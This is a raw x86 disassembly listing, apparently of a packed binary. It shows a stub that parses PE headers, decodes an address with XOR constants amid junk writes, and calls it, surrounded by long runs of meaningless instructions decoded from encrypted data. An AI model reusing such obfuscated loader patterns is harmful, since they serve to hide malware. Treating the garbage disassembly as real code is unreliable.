  40f8c0:	cmp    bl,BYTE PTR [ecx]
  40f8c2:	pop    ss
  40f8c3:	xchg   ecx,eax
  40f8c4:	dec    esi
  40f8c5:	pusha  
  40f8c6:	cmove  ebx,DWORD PTR ds:[edx]
  40f8ca:	push   eax
  40f8cb:	or     eax,0xf04bbe8e
  40f8d0:	inc    esi
  40f8d1:	or     bl,ah
  40f8d3:	pop    esi
  40f8d4:	mov    esp,0xa92083ca
  40f8d9:	call   FWORD PTR [edi]
  40f8db:	mov    ebx,0xcb98f369
  40f8e0:	adc    BYTE PTR [ecx-0x1d],0xb9
  40f8e4:	or     ecx,esi
  40f8e6:	das    
  40f8e7:	scas   eax,DWORD PTR es:[edi]
  40f8e8:	pop    esi
  40f8e9:	stos   BYTE PTR es:[edi],al
  40f8ea:	mov    ds:0x20e3824,al
  40f8ef:	stos   DWORD PTR es:[edi],eax
  40f8f0:	and    esp,DWORD PTR [ecx-0xa]
  40f8f3:	aas    
  40f8f4:	mov    WORD PTR [eax],fs
  40f8f6:	inc    ebp
  40f8f7:	in     eax,0xc1
  40f8f9:	retf   
  40f8fa:	call   0xe15d6987
  40f8ff:	cli    
  40f900:	repnz lods eax,DWORD PTR ds:[esi]
  40f902:	addr16 int3 
  40f904:	add    edx,DWORD PTR [edx]
  40f906:	and    al,BYTE PTR [edi+edi*1]
  40f909:	jno    0x40f89d
  40f90b:	retf   0xa565
  40f90e:	mov    al,ds:0xf4aba692
  40f913:	sbb    edx,DWORD PTR [eax-0xe9f66a9]
  40f919:	jb     0x40f8db
  40f91b:	fdiv   QWORD PTR [ecx+ecx*2-0x73]
  40f91f:	jae    0x40f91f
  40f921:	and    al,0x35
  40f923:	and    eax,0x813904e5
  40f928:	and    eax,0x43372b
  40f92d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f92e:	ss inc ebx
  40f930:	add    BYTE PTR [eax*2-0x7af03cc4],dh
  40f937:	add    DWORD PTR [eax],0xca130000
  40f93d:	mov    eax,DWORD PTR [ebp+0x8]
  40f940:	movzx  ecx,WORD PTR ds:0x43365f
  40f947:	add    DWORD PTR ds:0x433647,ecx
  40f94d:	mov    ecx,DWORD PTR [ebp+0x8]
  40f950:	add    ecx,DWORD PTR [eax+0x3c]
  40f953:	sub    DWORD PTR ds:0x43372f,0x5c72
  40f95d:	mov    edx,0x7510853
  40f962:	add    DWORD PTR ds:0x433717,0x767c
  40f96c:	mov    DWORD PTR [ebp+0x8],ecx
  40f96f:	adc    eax,DWORD PTR ds:0x4336a7
  40f975:	mov    eax,DWORD PTR [ebp-0x4]
  40f978:	movzx  ecx,BYTE PTR ds:0x433763
  40f97f:	adc    ecx,DWORD PTR ds:0x4336ab
  40f985:	mov    DWORD PTR ds:0x433763,ecx
  40f98b:	xor    eax,edx
  40f98d:	push   esi
  40f98e:	xor    esi,0x76d3
  40f994:	mov    esi,DWORD PTR [ebp+0x8]
  40f997:	mov    ecx,0x32729a
  40f99c:	add    eax,ecx
  40f99e:	cmp    DWORD PTR [esi+0x54],eax
  40f9a1:	pop    esi
  40f9a2:	je     0x40f9b0
  40f9a8:	mov    eax,DWORD PTR [ebp+0x8]
  40f9ab:	jmp    0x40f9c9
  40f9b0:	mov    eax,DWORD PTR [ebp-0x4]
  40f9b3:	xor    eax,edx
  40f9b5:	add    eax,ecx
  40f9b7:	jmp    0x40f9c9
  40f9bc:	mov    eax,DWORD PTR [ebp-0x4]
  40f9bf:	xor    eax,0x7510853
  40f9c4:	add    eax,0x32729a
  40f9c9:	leave  
  40f9ca:	ret    0x4
  40f9cd:	push   ebp
  40f9ce:	mov    ebp,esp
  40f9d0:	push   ecx
  40f9d1:	mov    ecx,DWORD PTR [ebp+0x8]
  40f9d4:	mov    eax,0x7510853
  40f9d9:	or     DWORD PTR ds:0x4336b3,0x4336af
  40f9e3:	xor    ecx,eax
  40f9e5:	add    DWORD PTR ds:0x433723,0x6057
  40f9ef:	add    ecx,0x32729a
  40f9f5:	mov    DWORD PTR ds:0x433697,0x14d8
  40f9ff:	mov    DWORD PTR [ebp+0x10],ecx
  40fa02:	mov    ecx,0x737
  40fa07:	mov    DWORD PTR [ebp+0x8],0xf34ceb9
  40fa0e:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  40fa15:	mov    DWORD PTR ds:0x4336db,edi
  40fa1b:	mov    ecx,0xf89c8534
  40fa20:	mov    DWORD PTR ds:0x433647,0x6b28
  40fa2a:	push   esi
  40fa2b:	mov    esi,DWORD PTR ds:0x43375f
  40fa31:	mov    DWORD PTR [ebp+0x10],0x70019fb
  40fa38:	mov    esi,DWORD PTR [ebp-0x4]
  40fa3b:	cmp    ecx,esi
  40fa3d:	mov    DWORD PTR ds:0x4336e3,0x9e9
  40fa47:	je     0x40fa8c
  40fa4d:	mov    esi,DWORD PTR [ebp+0xc]
  40fa50:	sbb    DWORD PTR ds:0x433733,0x4336a7
  40fa5a:	xor    ecx,eax
  40fa5c:	xor    DWORD PTR ds:0x43371b,0x6006
  40fa66:	xor    esi,eax
  40fa68:	lea    ecx,[esi+ecx*1+0x32729a]
  40fa6f:	xor    DWORD PTR ds:0x4336af,0x4a94
  40fa79:	xor    ecx,eax
  40fa7b:	cmp    ecx,0xf89c8525
  40fa81:	jne    0x40fa2b
  40fa87:	jmp    0x410084
  40fa8c:	add    DWORD PTR ds:0x43371b,ebx
  40fa92:	add    ecx,0xffcd8d66
  40fa98:	xor    DWORD PTR ds:0x4336a3,ebx
  40fa9e:	mov    esi,ecx
  40faa0:	or     DWORD PTR ds:0x43365f,0x3fd0
  40faaa:	xor    esi,eax
  40faac:	mov    DWORD PTR ds:0x43365f,0x62c3
  40fab6:	add    esi,DWORD PTR [ebp+0x8]
  40fab9:	mov    DWORD PTR [ebp+0x8],esi
  40fabc:	or     esi,DWORD PTR ds:0x43365f
  40fac2:	mov    esi,DWORD PTR [ebp+0x8]
  40fac5:	xor    esi,ecx
  40fac7:	xor    esi,eax
  40fac9:	mov    eax,DWORD PTR [edx+0x194]
  40facf:	jmp    0x40fd9e
  40fad4:	daa    
  40fad5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fad6:	or     DWORD PTR [esi-0x5a484d63],eax
  40fadc:	scas   al,BYTE PTR es:[edi]
  40fadd:	add    al,0x3b
  40fadf:	clc    
  40fae0:	fdivr  st,st(5)
  40fae2:	shl    DWORD PTR [edx+0x7c7cb33d],0xae
  40fae9:	jle    0x40fb67
  40faeb:	jl     0x40fafd
  40faed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40faee:	ss push 0x9b1a0c9
  40faf4:	test   eax,0x4e54b180
  40faf9:	div    ch
  40fafb:	aas    
  40fafc:	sub    ebp,DWORD PTR [ecx+0x52949f8a]
  40fb02:	cmp    DWORD PTR [esp+eax*2+0x1],esp
  40fb06:	push   ebx
  40fb07:	lods   al,BYTE PTR ss:[esi]
  40fb09:	jo     0x40fadd
  40fb0b:	aad    0xe3
  40fb0d:	pop    DWORD PTR [edx-0x63]
  40fb10:	push   esi
  40fb11:	scas   eax,DWORD PTR es:[edi]
  40fb12:	outs   dx,BYTE PTR ds:[esi]
  40fb13:	adc    eax,0x6ac60418
  40fb18:	imul   ebp,DWORD PTR ds:0x9135d378,0x8c0a16a2
  40fb22:	(bad)  
  40fb23:	dec    edx
  40fb24:	push   0xb7fbc0a2
  40fb29:	sub    cl,BYTE PTR [ebx]
  40fb2b:	lahf   
  40fb2c:	push   edx
  40fb2d:	dec    esp
  40fb2e:	outs   dx,BYTE PTR ds:[esi]
  40fb2f:	icebp  
  40fb30:	pop    ds
  40fb31:	sub    eax,0x970d003f
  40fb36:	sbb    bh,BYTE PTR [ebx]
  40fb38:	dec    esi
  40fb39:	push   ecx
  40fb3a:	adc    ebp,ebx
  40fb3c:	gs aam 0xd7
  40fb3f:	(bad)  
  40fb40:	xor    cl,BYTE PTR [edx+eiz*4-0x54934e31]
  40fb47:	repz retf 0x1885
  40fb4b:	ds push cs
  40fb4d:	dec    eax
  40fb4e:	fisub  DWORD PTR [esp+ebx*1]
  40fb51:	push   edi
  40fb52:	sub    ah,cl
  40fb54:	dec    edx
  40fb55:	call   0xffde5b48
  40fb5a:	pop    ebp
  40fb5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb5c:	repnz xor BYTE PTR [edi],dh
  40fb5f:	or     BYTE PTR [edi-0x3c],ah
  40fb62:	cmp    eax,0x29135e9c
  40fb67:	aam    0xfe
  40fb69:	inc    esp
  40fb6a:	or     eax,0x12fe42a4
  40fb6f:	mov    dh,0x76
  40fb71:	jp     0x40fb85
  40fb73:	inc    ebx
  40fb74:	or     BYTE PTR [edx+0x7fe999cc],ch
  40fb7a:	sbb    BYTE PTR [edi+0x4e063631],dl
  40fb80:	call   0x9c8f:0xdf1e3ab
  40fb87:	jne    0x40fbfb
  40fb89:	mov    edi,0xc3746af5
  40fb8e:	aaa    
  40fb8f:	fild   DWORD PTR ds:0x2d9c2aa0
  40fb95:	jl     0x40fbcd
  40fb97:	int3   
  40fb98:	sub    BYTE PTR [edx+0x14bcf3a5],bl
  40fb9e:	xchg   DWORD PTR [eax+0x7573223b],eax
  40fba4:	push   0xfffffffb
  40fba6:	outs   dx,DWORD PTR ds:[esi]
  40fba7:	xchg   ebx,eax
  40fba8:	addr16 add ebx,edx
  40fbab:	cdq    
  40fbac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fbad:	mov    BYTE PTR [esp+edi*1+0x4affb86c],ch
  40fbb4:	ffreep st(4)
  40fbb6:	xor    al,0x63
  40fbb8:	sub    BYTE PTR [edx+0x50],ah
  40fbbb:	push   eax
  40fbbc:	xchg   edx,eax
  40fbbd:	sbb    al,0x84
  40fbbf:	pop    esi
  40fbc0:	xchg   ecx,eax
  40fbc1:	jne    0x40fb57
  40fbc3:	mov    ah,0xba
  40fbc5:	mov    ebx,0x8d355add
  40fbca:	pop    ebp
  40fbcb:	inc    ebx
  40fbcc:	or     edx,eax
  40fbce:	or     BYTE PTR [esi-0x63],dh
  40fbd1:	xchg   BYTE PTR [ecx],cl
  40fbd3:	call   0x20efbba9
  40fbd8:	imul   esp,DWORD PTR [edi+0x68],0x3b
  40fbdc:	repnz fnstenv [edi-0x60]
  40fbe0:	mov    ds:0x7ff09eb2,eax
  40fbe5:	cmp    ah,dh
  40fbe7:	call   0x4dd:0x43315b4f
  40fbee:	(bad)  
  40fbef:	mov    dh,0x99
  40fbf1:	and    ch,BYTE PTR [ebx-0x1f]
  40fbf4:	sahf   
  40fbf5:	bound  ecx,QWORD PTR [esi-0x23886799]
  40fbfb:	inc    ebp
  40fbfc:	mov    bh,0x74
  40fbfe:	scas   al,BYTE PTR es:[edi]
  40fbff:	xchg   ebp,eax
  40fc00:	out    0x4d,al
  40fc02:	xor    ch,BYTE PTR [edi]
  40fc04:	xchg   ecx,eax
  40fc05:	lods   eax,DWORD PTR ds:[esi]
  40fc06:	hlt    
  40fc07:	mov    BYTE PTR [esi],dh
  40fc09:	sub    al,0xab
  40fc0b:	sbb    DWORD PTR [ebp-0x64],ebx
  40fc0e:	inc    BYTE PTR [ecx+0x7c5be5c4]
  40fc14:	lds    esp,FWORD PTR [esi+eax*2+0x48bd82c6]
  40fc1b:	jecxz  0x40fc9a
  40fc1d:	fwait
  40fc1e:	mov    ecx,0x4e77ce2
  40fc23:	pop    esp
  40fc24:	out    dx,al
  40fc25:	inc    ebp
  40fc26:	stos   BYTE PTR es:[edi],al
  40fc27:	std    
  40fc28:	data16 xor BYTE PTR [esi-0x48],0x13
  40fc2d:	mov    edi,0xa48e4860
  40fc32:	out    dx,eax
  40fc33:	xchg   ecx,eax
  40fc34:	add    DWORD PTR [edi-0x7d6c0e2],0xdf7ec45
  40fc3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc3f:	jnp    0x40fc5f
  40fc41:	jmp    0x71e27cf4
  40fc46:	in     al,dx
  40fc47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc48:	jne    0x40fc01
  40fc4a:	and    al,0x9f
  40fc4c:	bound  ebp,QWORD PTR [esi-0x28a0e26d]
  40fc52:	sub    esp,edi
  40fc54:	push   ss
  40fc55:	push   edi
  40fc56:	jae    0x40fcc8
  40fc58:	aas    
  40fc59:	push   esi
  40fc5a:	mov    BYTE PTR [ebx],cl
  40fc5c:	sub    eax,DWORD PTR [ebx]
  40fc5e:	push   0xffffffbf
  40fc60:	pop    esi
  40fc61:	and    DWORD PTR [edi],ebx
  40fc63:	bound  ecx,QWORD PTR [ecx-0x12]
  40fc66:	cmp    cl,bh
  40fc68:	or     BYTE PTR [edi-0x39],0x7a
  40fc6c:	in     eax,0xc1
  40fc6e:	fs sti 
  40fc70:	retf   0x90db
  40fc73:	cmp    edi,DWORD PTR [ecx-0x11]
  40fc76:	push   edi
  40fc77:	inc    eax
  40fc78:	xchg   esp,eax
  40fc79:	inc    eax
  40fc7a:	jl     0x40fcf9
  40fc7c:	mov    esp,0xa350dff8
  40fc81:	(bad)  
  40fc82:	mov    eax,0x43e40af2
  40fc87:	imul   esp,DWORD PTR [esi-0x66],0xece8afad
  40fc8e:	mov    ch,0xf
  40fc90:	loopne 0x40fc7b
  40fc92:	xor    al,0xf0
  40fc94:	pop    esp
  40fc95:	sbb    eax,0xaf63c341
  40fc9a:	out    dx,al
  40fc9b:	(bad)  
  40fc9d:	mov    ch,0x90
  40fc9f:	fild   WORD PTR [esp+ecx*4]
  40fca2:	out    0x3d,al
  40fca4:	cmp    al,0x5d
  40fca6:	imul   esi,DWORD PTR [ebx-0x71],0xffffffc0
  40fcaa:	sbb    eax,0xca6c31d3
  40fcaf:	adc    eax,0x7f0a4180
  40fcb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fcb5:	mov    DWORD PTR [esi-0x5bcce54c],edx
  40fcbb:	shr    DWORD PTR [ebx+0x3d666726],cl
  40fcc1:	sub    bh,BYTE PTR [ebp+0x1318c719]
  40fcc7:	push   esp
  40fcc8:	mov    ecx,esp
  40fcca:	adc    DWORD PTR [ebx+0x6fee8178],ebp
  40fcd0:	repz cdq 
  40fcd2:	stos   BYTE PTR es:[edi],al
  40fcd3:	inc    edx
  40fcd4:	mov    ch,0x19
  40fcd6:	xchg   ecx,eax
  40fcd7:	dec    esi
  40fcd8:	mov    ds:0xa912e363,al
  40fcdd:	dec    ebx
  40fcde:	daa    
  40fcdf:	pusha  
  40fce0:	cdq    
  40fce1:	ins    BYTE PTR es:[edi],dx
  40fce2:	or     esi,esp
  40fce4:	enter  0xb7f9,0x8d
  40fce8:	mov    al,ds:0xf8097f87
  40fced:	mov    WORD PTR [edi-0x14d0a855],gs
  40fcf3:	lods   eax,DWORD PTR ds:[esi]
  40fcf4:	pop    ss
  40fcf5:	ds pop es
  40fcf7:	into   
  40fcf8:	(bad)  
  40fcf9:	fnsave [ecx+0x9ebf8f7]
  40fcff:	in     eax,dx
  40fd00:	pop    esp
  40fd01:	cli    
  40fd02:	dec    edi
  40fd03:	in     eax,dx
  40fd04:	daa    
  40fd05:	(bad)  
  40fd07:	xor    eax,0x405a8ff9
  40fd0c:	mov    dx,fs
  40fd0f:	imul   ebp,DWORD PTR [ebx-0x2f],0x23
  40fd13:	jae    0x40fcb9
  40fd15:	rol    DWORD PTR [ecx-0x58d32bec],1
  40fd1b:	xor    eax,0x99c6f72e
  40fd20:	sbb    ecx,edx
  40fd22:	(bad)  
  40fd23:	dec    ebx
  40fd24:	jmp    0x40fd64
  40fd26:	jne    0x40fd29
  40fd28:	ds and al,0x81
  40fd2b:	mov    dl,0x78
  40fd2d:	and    BYTE PTR [ecx-0x2f],cl
  40fd30:	js     0x40fd1e
  40fd32:	dec    esi
  40fd33:	nop
  40fd34:	(bad)  
  40fd35:	mov    dh,0x87
  40fd37:	push   esi
  40fd38:	xor    BYTE PTR [ecx+ebp*4-0x1b],al
  40fd3c:	sti    
  40fd3d:	pop    edx
  40fd3e:	inc    esp
  40fd3f:	push   ebp
  40fd40:	adc    bl,ch
  40fd42:	pop    ebx
  40fd43:	xor    esp,ecx
  40fd45:	ficomp WORD PTR [ebx+0x73]
  40fd48:	int    0xd5
  40fd4a:	fadd   st,st(0)
  40fd4c:	gs mov ebp,0xba126b92
  40fd52:	cld    
  40fd53:	sbb    al,BYTE PTR [ebx+0x7ab1ac43]
  40fd59:	jb     0x40fda4
  40fd5b:	jae    0x40fd27
  40fd5d:	or     DWORD PTR [edx],0xbe04e313
  40fd63:	mov    ebp,0xbf19291a
  40fd68:	pop    es
  40fd69:	sahf   
  40fd6a:	repnz or DWORD PTR [eax+esi*2],0xffffffbf
  40fd6f:	add    DWORD PTR [ebx-0x42],esi
  40fd72:	(bad)  
  40fd73:	mov    BYTE PTR [eax],0x83
  40fd76:	loopne 0x40fd7a
  40fd78:	lods   eax,DWORD PTR ds:[esi]
  40fd79:	cmp    eax,0xce7ee2a5
  40fd7e:	dec    edx
  40fd7f:	push   edx
  40fd80:	inc    edx
  40fd81:	daa    
  40fd82:	dec    ecx
  40fd83:	les    edi,FWORD PTR [esi]
  40fd85:	popf   
  40fd86:	mov    ecx,0x633f4a43
  40fd8b:	mov    ecx,0x17cb49e8
  40fd90:	loopne 0x40fde3
  40fd92:	cmp    esi,ebx
  40fd94:	push   esp
  40fd95:	std    
  40fd96:	dec    edx
  40fd97:	add    cx,WORD PTR ss:[ebx]
  40fd9b:	ror    BYTE PTR ds:0x11088b85,1
  40fda1:	adc    eax,0x43365f
  40fda6:	mov    eax,DWORD PTR [ecx+0x3c]
  40fda9:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40fdad:	add    eax,ecx
  40fdaf:	mov    DWORD PTR [ebp+0x8],esi
  40fdb2:	mov    DWORD PTR [ebp+0x10],eax
  40fdb5:	jmp    0x410084
  40fdba:	in     al,0xad
  40fdbc:	jae    0x40fd87
  40fdbe:	jge    0x40fd89
  40fdc0:	bound  edi,QWORD PTR [ebp-0x71547538]
  40fdc6:	int3   
  40fdc7:	fwait
  40fdc8:	sub    eax,0x7cbd6f9f
  40fdcd:	jl     0x40fd7d
  40fdcf:	jle    0x40fe4d
  40fdd1:	jl     0x40fdb5
  40fdd3:	and    BYTE PTR [ecx],bh
  40fdd5:	cmc    
  40fdd6:	jp     0x40fd8b
  40fdd8:	mov    eax,ds:0xa69722ef
  40fddd:	retf   
  40fdde:	std    
  40fddf:	(bad)  [edx]
  40fde1:	add    eax,0x1a7bc217
  40fde6:	push   DWORD PTR [edx-0x1b4decbf]
  40fdec:	(bad)  
  40fded:	push   ecx
  40fdee:	jecxz  0x40fe06
  40fdf0:	xor    eax,0x85daec0b
  40fdf5:	scas   eax,DWORD PTR es:[edi]
  40fdf6:	xchg   dh,cl
  40fdf8:	popa   
  40fdf9:	sub    cl,al
  40fdfb:	lea    ebx,[edx-0x3d]
  40fdfe:	xor    ebx,ebx
  40fe00:	jae    0x40fde0
  40fe02:	std    
  40fe03:	push   0xffffffe5
  40fe05:	mov    edi,0x524b9258
  40fe0a:	sub    eax,0xc863764d
  40fe0f:	shl    dl,1
  40fe11:	cld    
  40fe12:	pushf  
  40fe13:	test   DWORD PTR [eax-0x51],edi
  40fe16:	jg     0x40fda8
  40fe18:	call   0x66ad:0x58f97fba
  40fe1f:	cs std 
  40fe21:	mov    ch,0xbc
  40fe23:	push   ss
  40fe24:	adc    eax,0x27d39e0b
  40fe29:	neg    DWORD PTR [eax]
  40fe2b:	xor    DWORD PTR [eax+0x1ecee745],ebp
  40fe31:	pusha  
  40fe32:	push   edx
  40fe33:	imul   ecx,DWORD PTR [esi],0xffffffd6
  40fe36:	inc    edx
  40fe37:	adc    edi,DWORD PTR [ebx-0x173ab919]
  40fe3d:	pop    es
  40fe3e:	(bad)  
  40fe40:	adc    BYTE PTR [esi+0x2bbd6ca7],ah
  40fe46:	xchg   ebp,eax
  40fe47:	xor    eax,0x6f07353a
  40fe4c:	jmp    0x265f:0x68cb05f5
  40fe53:	inc    esp
  40fe54:	clc    
  40fe55:	push   0xffffffb2
  40fe57:	add    bh,BYTE PTR ds:0xf46c97
  40fe5d:	add    eax,DWORD PTR [eax+0x5aed7781]
  40fe63:	popf   
  40fe64:	in     eax,dx
  40fe65:	push   0x3b05a7dc
  40fe6a:	rol    DWORD PTR [ebx-0x6b],cl
  40fe6d:	mov    al,ds:0x7ef6eb46
  40fe72:	pop    es
  40fe73:	sub    eax,0x57350dab
  40fe78:	leave  
  40fe79:	fmul   DWORD PTR [ecx-0x9]
  40fe7c:	inc    edi
  40fe7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe7e:	and    BYTE PTR [esi],bl
  40fe80:	cld    
  40fe81:	push   ebx
  40fe82:	cmp    al,0x70
  40fe84:	cmp    ah,bl
  40fe86:	dec    ebx
  40fe87:	pop    ss
  40fe88:	iret   
  40fe89:	jns    0x40fe94
  40fe8b:	pop    edx
  40fe8c:	push   ds
  40fe8d:	pavgb  mm5,QWORD PTR [eax-0x757a426e]
  40fe94:	inc    esp
  40fe95:	retf   
  40fe96:	aam    0xb7
  40fe98:	push   ebx
  40fe99:	mov    ds:0xe9fb6352,al
  40fe9e:	cmc    
  40fe9f:	push   es
  40fea0:	jns    0x40fef4
  40fea2:	sar    BYTE PTR [edi-0xb8b470],cl
  40fea8:	push   ds
  40fea9:	paddw  mm6,mm5
  40feac:	mov    cl,0xea
  40feae:	(bad)  
  40feaf:	outs   dx,BYTE PTR ds:[esi]
  40feb0:	ror    BYTE PTR [edx-0x5a22f22c],0x15
  40feb7:	ret    0xb836
  40feba:	js     0x40feb7
  40febc:	data16 jno 0x40fe62
  40febf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fec0:	jbe    0x40ff31
  40fec2:	in     eax,dx
  40fec3:	sbb    eax,0x38d00381
  40fec8:	aam    0xb8
  40feca:	sbb    BYTE PTR [ecx-0x6baf6f78],ch
  40fed0:	jno    0x40ff4e
  40fed2:	cmp    ch,cl
  40fed4:	dec    edi
  40fed5:	test   DWORD PTR [edi+0x51f518f3],0x1e533e40
  40fedf:	mov    esp,DWORD PTR ds:0xf8c0c45f
  40fee5:	(bad)  
  40fee6:	fstp   DWORD PTR [edi-0x4c]
  40fee9:	(bad)  
  40feea:	in     al,0xfd
  40feec:	(bad)  
  40feed:	stos   DWORD PTR es:[edi],eax
  40feee:	clc    
  40feef:	or     dl,BYTE PTR [edi]
  40fef1:	cdq    
  40fef2:	nop
  40fef3:	or     al,0xad
  40fef5:	iret   
  40fef6:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40fef8:	mov    dh,0x1e
  40fefa:	sbb    esp,DWORD PTR [ecx-0x7d6915d0]
  40ff00:	mov    ecx,0x5310d40a
  40ff05:	mov    ecx,0x859d3df0
  40ff0a:	shl    ecx,1
  40ff0c:	dec    esp
  40ff0d:	xchg   al,dh
  40ff0f:	inc    esi
  40ff10:	xor    eax,0xb616f33d
  40ff15:	jp     0x40fef9
  40ff17:	sbb    dl,cl
  40ff19:	push   ebp
  40ff1a:	sub    BYTE PTR [esi-0x40],ah
  40ff1d:	push   ebx
  40ff1e:	mov    BYTE PTR [esp+eiz*8],dh
  40ff21:	repz adc al,0xf5
  40ff24:	add    ecx,eax
  40ff26:	and    esi,DWORD PTR [ecx+0x269af781]
  40ff2c:	lea    esi,[eax]
  40ff2e:	jnp    0x40fec0
  40ff30:	push   edi
  40ff31:	arpl   WORD PTR [eax-0x6e37a09d],di
  40ff37:	jo     0x40ff85
  40ff39:	inc    eax
  40ff3a:	adc    esp,DWORD PTR [ecx]
  40ff3c:	pop    eax
  40ff3d:	repnz xchg ebp,eax
  40ff3f:	or     al,0x53
  40ff41:	in     eax,0x7e
  40ff43:	popf   
  40ff44:	imul   edi,DWORD PTR [esi],0xc1f0d386
  40ff4a:	outs   dx,BYTE PTR ds:[esi]
  40ff4b:	sub    eax,edx
  40ff4d:	aam    0xf4
  40ff4f:	mov    esi,0x842a5bf
  40ff54:	clc    
  40ff55:	inc    ebx
  40ff56:	into   
  40ff57:	enter  0x5bc1,0xb1
  40ff5b:	jecxz  0x40ff91
  40ff5d:	in     eax,0x62
  40ff5f:	lds    ebx,FWORD PTR [esi]
  40ff61:	jnp    0x40ff72
  40ff63:	fnstsw WORD PTR [esi+0x5]
  40ff66:	cmc    
  40ff67:	add    edi,edi
  40ff69:	outs   dx,DWORD PTR ds:[esi]
  40ff6a:	pop    es
  40ff6b:	inc    ecx
  40ff6c:	pusha  
  40ff6d:	rcl    BYTE PTR [ebp-0x4504cb2c],1
  40ff73:	popf   
  40ff74:	inc    edx
  40ff75:	inc    edx
  40ff76:	sub    al,0x57
  40ff78:	jle    0x40ff54
  40ff7a:	stos   BYTE PTR es:[edi],al
  40ff7b:	pushf  
  40ff7c:	add    BYTE PTR [edx+0x6919ce04],ch
  40ff82:	repnz test eax,0x9dc7b666
  40ff88:	rol    ebp,0xeb
  40ff8b:	add    al,0xcf
  40ff8d:	xchg   ah,ah
  40ff8f:	pop    ebp
  40ff90:	fldcw  WORD PTR [esi]
  40ff92:	daa    
  40ff93:	sti    
  40ff94:	jns    0x40ff27
  40ff96:	or     eax,0x857e6679
  40ff9b:	pop    ss
  40ff9c:	enter  0xaae4,0xab
  40ffa0:	jne    0x40ff31
  40ffa2:	idiv   DWORD PTR [edx]
  40ffa4:	fucomi st,st(4)
  40ffa6:	sahf   
  40ffa7:	xlat   BYTE PTR ds:[ebx]
  40ffa8:	(bad)  
  40ffa9:	cmp    esp,DWORD PTR [esi-0x21]
  40ffac:	out    dx,eax
  40ffad:	mov    cl,0x60
  40ffaf:	dec    esi
  40ffb0:	rcl    BYTE PTR [eax],1
  40ffb2:	inc    eax
  40ffb3:	cmp    BYTE PTR [ebp+edi*2-0x60],0x7a
  40ffb8:	(bad)  
  40ffb9:	call   0xf874d4e7
  40ffbe:	add    dl,al
  40ffc0:	sbb    BYTE PTR [ecx-0x58],0xa5
  40ffc4:	mov    eax,ds:0x127ac80
  40ffc9:	jno    0x41002b
  40ffcb:	retf   
  40ffcc:	aad    0xbc
  40ffce:	ret    
  40ffcf:	inc    edi
  40ffd0:	add    al,0x6
  40ffd2:	jnp    0x410021
  40ffd4:	mov    ds:0xfefa1dd7,al
  40ffd9:	mov    ah,0xa5
  40ffdb:	js     0x41004b
  40ffdd:	lea    edi,[ecx]
  40ffdf:	call   0x553792bc
  40ffe4:	test   bh,0x7e
  40ffe7:	xchg   DWORD PTR [edi],ebx
  40ffe9:	bound  edx,QWORD PTR [edx]
  40ffeb:	sbb    al,BYTE PTR [esi+0x17be0fce]
  40fff1:	cmpxchg dh,dh
  40fff4:	sub    eax,0x77ba330a
  40fff9:	lods   eax,DWORD PTR ds:[esi]
  40fffa:	sti    
  40fffb:	lods   al,BYTE PTR ds:[esi]
  40fffc:	mov    ecx,0x51da1ccc
  410001:	jl     0x40ff89
  410003:	push   0x11
  410005:	jge    0x410014
  410007:	les    eax,FWORD PTR [esi-0x594a3809]
  41000d:	jg     0x410078
  41000f:	cmp    eax,0x964d5d94
  410014:	push   es
  410015:	pop    esp
  410016:	stos   BYTE PTR es:[edi],al
  410017:	cwde   
  410018:	inc    esi
  410019:	mov    eax,ds:0xd497409c
  41001e:	loope  0x41002f
  410020:	outs   dx,BYTE PTR ds:[esi]
  410021:	dec    ebx
  410022:	jne    0x4100a3
  410024:	loop   0x41006f
  410026:	push   esi
  410027:	jle    0x40fff2
  410029:	cmp    dh,BYTE PTR [edi-0x6c]
  41002c:	xchg   esi,eax
  41002d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41002e:	(bad)  
  41002f:	push   ss
  410030:	xchg   edi,eax
  410031:	retf   0x8dfa
  410034:	cs scas eax,DWORD PTR es:[edi]
  410036:	in     eax,dx
  410037:	mov    dh,BYTE PTR [ebx-0x29d30402]
  41003d:	ja     0x41009d
  41003f:	rcl    BYTE PTR [edi-0x27e5064],1
  410045:	mov    ecx,0x591a9357
  41004a:	cld    
  41004b:	fisttp WORD PTR [ebx-0x190205c2]
  410051:	adc    DWORD PTR [edx],esp
  410053:	jg     0x40fff4
  410055:	pop    es
  410056:	stc    
  410057:	mov    ds:0x2da47c71,al
  41005c:	mov    ebx,0xa8aff78c
  410061:	imul   edx,DWORD PTR [ebp+0x505e5c08],0x73ebebe5
  41006b:	fdiv   st,st(2)
  41006d:	sub    ebp,edi
  41006f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410070:	inc    esi
  410071:	cdq    
  410072:	fst    DWORD PTR [edi-0x3fce2570]
  410078:	aaa    
  410079:	mov    dl,0x32
  41007b:	sub    DWORD PTR [ebx-0x24],ebx
  41007e:	adc    edi,ebx
  410080:	js     0x410076
  410082:	mov    bl,0x8
  410084:	mov    eax,DWORD PTR [ebp+0x10]
  410087:	pop    esi
  410088:	test   eax,eax
  41008a:	je     0x4100ae
  410090:	push   DWORD PTR ds:0x413bee
  410096:	push   DWORD PTR ds:0x41399a
  41009c:	mov    eax,DWORD PTR [edx+0x194]
  4100a2:	push   DWORD PTR [eax]
  4100a4:	mov    eax,DWORD PTR [ebp+0x10]
  4100a7:	call   eax
  4100a9:	jmp    0x4100b1
  4100ae:	mov    eax,DWORD PTR [ebp+0x10]
  4100b1:	leave  
  4100b2:	ret    0xc
  4100b5:	push   ebp
  4100b6:	mov    ebp,esp
  4100b8:	sub    esp,0x30
  4100bb:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  4100c2:	and    DWORD PTR ds:0x4336df,0x0
  4100cc:	jmp    0x4100dc
  4100d1:	mov    eax,ds:0x4336df
  4100d6:	inc    eax
